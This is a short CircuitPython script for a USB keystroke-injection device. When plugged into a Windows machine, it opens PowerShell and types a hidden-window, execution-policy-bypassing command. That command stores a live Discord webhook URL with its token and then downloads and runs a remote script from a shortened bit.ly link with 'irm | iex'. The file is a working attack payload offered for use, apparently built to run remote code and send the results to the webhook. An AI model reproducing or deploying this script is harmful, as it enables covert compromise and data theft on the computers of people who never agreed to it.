import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

# Reduced initial wait time
time.sleep(3)

try:
    # Open Run dialog faster
    kbd.press(Keycode.GUI, Keycode.X)
    kbd.release_all()
    time.sleep(0.1)

    kbd.press(Keycode.I)
    kbd.release_all()
    time.sleep(1)
    # Type Script
    layout.write('powershell -w h -ExecutionPolicy Bypass -Command "Set-Variable -Name discord -Value \'https://discord.com/api/webhooks/1267879781404250123/X83marVWwVCWcCfycTSqdGdvFCgSVwNF1BXzS5A_HI-OlIf_A1DX-6I6xz9sJxP2SIvS\'; Write-Host $discord; irm bit.ly/4c44Xjl | iex"')

    # Immediately press Enter
    kbd.press(Keycode.ENTER)
    kbd.release_all()
      
    time.sleep(10)

except Exception as e:
    print(f"Error: {e}")

print("Powershell Executed, Giving 10 seconds buffer to disconnect")